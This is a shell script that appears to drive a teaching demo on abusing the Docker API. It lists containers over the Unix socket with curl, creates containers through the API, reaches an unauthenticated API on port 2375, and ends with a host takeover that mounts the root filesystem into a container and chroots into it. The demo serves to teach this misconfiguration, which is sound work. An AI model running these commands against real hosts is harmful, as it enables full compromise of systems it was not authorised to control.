#!/usr/bin/env sh

DEMO_DIR="$(dirname "$(realpath "$0")")"
DEMO_SLUG="$(basename "${DEMO_DIR}")"

source "${DEMO_DIR}/../_utils.sh"

TAB_NAME="Demo ${DEMO_SLUG}"

start_demo "Let's play with the API"

info "I can list images and containers"
command "curl -s --unix-socket /var/run/docker.sock ./containers/json | jq"
command "curl -s --unix-socket /var/run/docker.sock ./images/json | jq -r '.[] | \"\(.Id)\\\t\(.RepoTags | last)\"'"

printf "\n"

info "Even if I'm not root or in the docker group, as long as I can communicate with the socket!"
command "sudo -l"
command "sudo curl -s --unix-socket /var/run/docker.sock ./containers/json | jq"

printf "\n"

info "And now the fun part: I can start a container from the API"
command "sudo curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"sh\"]}' ./containers/create | jq"
command "sudo curl -s --unix-socket /var/run/docker.sock -X POST ./containers/<id>/start | jq"

printf "\n"

info "The API may also be exposed to the network"
attention "If it is not properly secured, it can lead to full privesc"
command "curl -s -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"sh\"]}' 127.0.0.1:2375/containers/create | jq"
command "curl -s 127.0.0.1:2375/containers/json\\?all=true | jq"
command "DOCKER_HOST=127.0.0.1:2375 docker ps -a"

printf "\n"

info "And now, let's show a full privesc, from a different host since the API is exposed on every port"
info "We bind-mount the host's root filesystem into the container and chroot into it"
command "DOCKER_HOST=ubuntu:2375 docker run --rm -it -v /:/host teaching/demos/debian chroot /host"

stop_demo
